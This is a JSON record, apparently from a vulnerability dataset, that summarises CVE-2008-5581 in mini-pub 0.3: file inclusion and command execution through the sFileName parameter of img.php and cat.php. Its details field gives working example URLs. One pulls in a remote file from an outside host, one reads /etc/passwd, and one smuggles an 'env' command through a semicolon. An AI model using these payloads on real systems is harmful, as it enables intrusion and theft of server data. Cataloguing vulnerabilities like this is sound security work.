  "CVE-2008-5581": {
    "related_content": true,
    "summary": "mini-pub 0.3 suffers from multiple vulnerabilities including remote file inclusion, local file inclusion, and command execution.",
    "root_cause": "The application does not properly sanitize user-supplied input when handling file paths in `img.php` and `cat.php`.",
    "vulnerabilities": [
      "Remote File Inclusion (RFI)",
      "Local File Inclusion (LFI)",
      "Command Execution"
    ],
    "impact": "An attacker can read arbitrary files from the server, execute arbitrary code on the server, and gain sensitive information like environment variables or `/etc/passwd` content. A remote attacker can leverage RFI to execute malicious code from external server. Local attackers can leverage LFI to access sensitive files in the server.",
    "attack_vectors": [
      "HTTP GET requests to vulnerable scripts `img.php` and `cat.php` with manipulated `sFileName` parameter."
    ],
     "attacker_capabilities": "The attacker needs to be able to send HTTP requests to the vulnerable application and needs to have knowledge of the application's folder structure.",
    "details": "The vulnerabilities are located in `img.php` and `cat.php` scripts. The `sFileName` parameter isn't properly sanitized which allows malicious path traversal. \n\n- RFI can be triggered via http://localhost/mini-pub.php/front-end/img.php?sFileName=http://site.com/cmd.txt?\n- LFI can be triggered via http://localhost/mini-pub.php/front-end/cat.php?sFileName=/etc/passwd\n- Command execution can be triggered via http://localhost/mini-pub.php/front-end/cat.php?sFileName=a%3Benv"
